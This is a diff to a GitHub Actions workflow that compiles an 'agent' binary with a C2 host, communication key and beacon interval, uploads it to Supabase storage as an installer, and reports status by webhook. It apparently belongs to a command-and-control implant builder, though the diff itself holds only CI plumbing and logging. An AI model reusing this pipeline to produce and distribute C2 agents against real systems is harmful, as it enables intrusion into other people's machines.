@@ -34,67 +34,177 @@ on:
         required: true
         type: string
 
+env:
+  SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+  SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+  BUILD_WEBHOOK_SECRET: ${{ secrets.BUILD_WEBHOOK_SECRET }}
+
 jobs:
   build:
     runs-on: ubuntu-latest
+    outputs:
+      build_success: ${{ steps.build.outcome == 'success' }}
+      storage_path: ${{ steps.upload.outputs.storage_path }}
+      file_size: ${{ steps.upload.outputs.file_size }}
+      checksum: ${{ steps.upload.outputs.checksum }}
+    
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout
+        uses: actions/checkout@v4
       
-      - uses: actions/setup-go@v5
+      - name: Setup Go
+        uses: actions/setup-go@v5
         with:
           go-version: '1.21'
       
       - name: Build Agent
+        id: build
         run: |
+          set -euo pipefail
+          
+          echo "::group::Build Configuration"
+          echo "Target OS: ${{ inputs.target_os }}"
+          echo "Target Arch: ${{ inputs.target_arch }}"
+          echo "Installer ID: ${{ inputs.installer_id }}"
+          echo "::endgroup::"
+          
           cd builder
+          
+          BINARY_NAME="agent_${{ inputs.target_os }}_${{ inputs.target_arch }}"
+          if [ "${{ inputs.target_os }}" == "windows" ]; then
+            BINARY_NAME="${BINARY_NAME}.exe"
+          fi
+          
+          echo "Building binary: $BINARY_NAME"
+          
           go run builder.go \
             -c2 "${{ inputs.c2_host }}" \
             -os "${{ inputs.target_os }}" \
             -arch "${{ inputs.target_arch }}" \
             -key "${{ inputs.communication_key }}" \
             -sleep "${{ inputs.sync_interval }}s" \
-            -out "agent_${{ inputs.target_os }}_${{ inputs.target_arch }}"
+            -out "$BINARY_NAME"
+          
+          echo "Build completed successfully"
+          ls -la "$BINARY_NAME"
+          
+          # Store binary name for next step
+          echo "binary_name=$BINARY_NAME" >> $GITHUB_OUTPUT
       
       - name: Upload to Supabase Storage
-        env:
-          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
-          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+        id: upload
         run: |
-          BINARY_PATH="builder/agent_${{ inputs.target_os }}_${{ inputs.target_arch }}"
-          if [ "${{ inputs.target_os }}" == "windows" ]; then
-            BINARY_PATH="${BINARY_PATH}.exe"
-          fi
+          set -euo pipefail
           
-          STORAGE_PATH="builds/${{ inputs.installer_id }}/$(basename $BINARY_PATH)"
-          FILE_SIZE=$(stat -f%z "$BINARY_PATH" 2>/dev/null || stat -c%s "$BINARY_PATH")
+          BINARY_PATH="builder/${{ steps.build.outputs.binary_name }}"
+          STORAGE_PATH="builds/${{ inputs.installer_id }}/${{ steps.build.outputs.binary_name }}"
+          
+          echo "::group::File Info"
+          echo "Binary path: $BINARY_PATH"
+          echo "Storage path: $STORAGE_PATH"
+          
+          # Get file size (works on both Linux and macOS)
+          FILE_SIZE=$(stat -c%s "$BINARY_PATH" 2>/dev/null || stat -f%z "$BINARY_PATH")
+          echo "File size: $FILE_SIZE bytes"
+          
+          # Get checksum
           CHECKSUM=$(sha256sum "$BINARY_PATH" | cut -d' ' -f1)
+          echo "Checksum: $CHECKSUM"
+          echo "::endgroup::"
           
-          # Upload to Supabase Storage
-          curl -X POST "$SUPABASE_URL/storage/v1/object/installers/$STORAGE_PATH" \
+          # Store outputs
+          echo "storage_path=$STORAGE_PATH" >> $GITHUB_OUTPUT
+          echo "file_size=$FILE_SIZE" >> $GITHUB_OUTPUT
+          echo "checksum=$CHECKSUM" >> $GITHUB_OUTPUT
+          
+          echo "::group::Uploading to Supabase Storage"
+          
+          UPLOAD_RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -X POST "$SUPABASE_URL/storage/v1/object/installers/$STORAGE_PATH" \
             -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
             -H "Content-Type: application/octet-stream" \
-            --data-binary @"$BINARY_PATH"
+            --data-binary @"$BINARY_PATH")
           
-          # Call webhook to update status
-          curl -X POST "$SUPABASE_URL/functions/v1/build-complete" \
+          UPLOAD_HTTP_CODE=$(echo "$UPLOAD_RESPONSE" | tail -n1)
+          UPLOAD_BODY=$(echo "$UPLOAD_RESPONSE" | sed '$d')
+          
+          echo "Upload HTTP Status: $UPLOAD_HTTP_CODE"
+          echo "Upload Response: $UPLOAD_BODY"
+          
+          if [ "$UPLOAD_HTTP_CODE" -lt 200 ] || [ "$UPLOAD_HTTP_CODE" -ge 300 ]; then
+            echo "::error::Upload failed with HTTP $UPLOAD_HTTP_CODE"
+            exit 1
+          fi
+          
+          echo "Upload successful!"
+          echo "::endgroup::"
+
+      - name: Notify Build Complete
+        if: success()
+        run: |
+          set -euo pipefail
+          
+          echo "::group::Sending build-complete webhook"
+          
+          WEBHOOK_PAYLOAD=$(cat <<EOF
+          {
+            "installer_id": "${{ inputs.installer_id }}",
+            "status": "completed",
+            "storage_path": "${{ steps.upload.outputs.storage_path }}",
+            "file_size": ${{ steps.upload.outputs.file_size }},
+            "checksum": "${{ steps.upload.outputs.checksum }}"
+          }
+          EOF
+          )
+          
+          echo "Payload: $WEBHOOK_PAYLOAD"
+          
+          WEBHOOK_RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -X POST "$SUPABASE_URL/functions/v1/build-complete" \
             -H "Content-Type: application/json" \
-            -H "X-Webhook-Secret: ${{ secrets.BUILD_WEBHOOK_SECRET }}" \
-            -d "{
-              \"installer_id\": \"${{ inputs.installer_id }}\",
-              \"status\": \"completed\",
-              \"storage_path\": \"$STORAGE_PATH\",
-              \"file_size\": $FILE_SIZE,
-              \"checksum\": \"$CHECKSUM\"
-            }"
-      
-      - name: Handle Failure
+            -H "x-webhook-secret: $BUILD_WEBHOOK_SECRET" \
+            -d "$WEBHOOK_PAYLOAD")
+          
+          WEBHOOK_HTTP_CODE=$(echo "$WEBHOOK_RESPONSE" | tail -n1)
+          WEBHOOK_BODY=$(echo "$WEBHOOK_RESPONSE" | sed '$d')
+          
+          echo "Webhook HTTP Status: $WEBHOOK_HTTP_CODE"
+          echo "Webhook Response: $WEBHOOK_BODY"
+          
+          if [ "$WEBHOOK_HTTP_CODE" -lt 200 ] || [ "$WEBHOOK_HTTP_CODE" -ge 300 ]; then
+            echo "::error::Webhook failed with HTTP $WEBHOOK_HTTP_CODE"
+            exit 1
+          fi
+          
+          echo "Build complete notification sent successfully!"
+          echo "::endgroup::"
+
+      - name: Notify Build Failed
         if: failure()
         run: |
-          curl -X POST "${{ secrets.SUPABASE_URL }}/functions/v1/build-complete" \
+          echo "::group::Sending build-failed webhook"
+          
+          WEBHOOK_PAYLOAD=$(cat <<EOF
+          {
+            "installer_id": "${{ inputs.installer_id }}",
+            "status": "failed",
+            "error": "Build failed - check GitHub Actions logs at ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+          }
+          EOF
+          )
+          
+          echo "Payload: $WEBHOOK_PAYLOAD"
+          
+          WEBHOOK_RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -X POST "$SUPABASE_URL/functions/v1/build-complete" \
             -H "Content-Type: application/json" \
-            -H "X-Webhook-Secret: ${{ secrets.BUILD_WEBHOOK_SECRET }}" \
-            -d "{
-              \"installer_id\": \"${{ inputs.installer_id }}\",
-              \"status\": \"failed\",
-              \"error\": \"Build failed - check GitHub Actions logs\"
-            }"
+            -H "x-webhook-secret: $BUILD_WEBHOOK_SECRET" \
+            -d "$WEBHOOK_PAYLOAD") || true
+          
+          WEBHOOK_HTTP_CODE=$(echo "$WEBHOOK_RESPONSE" | tail -n1)
+          WEBHOOK_BODY=$(echo "$WEBHOOK_RESPONSE" | sed '$d')
+          
+          echo "Webhook HTTP Status: $WEBHOOK_HTTP_CODE"
+          echo "Webhook Response: $WEBHOOK_BODY"
+          
+          echo "::endgroup::"
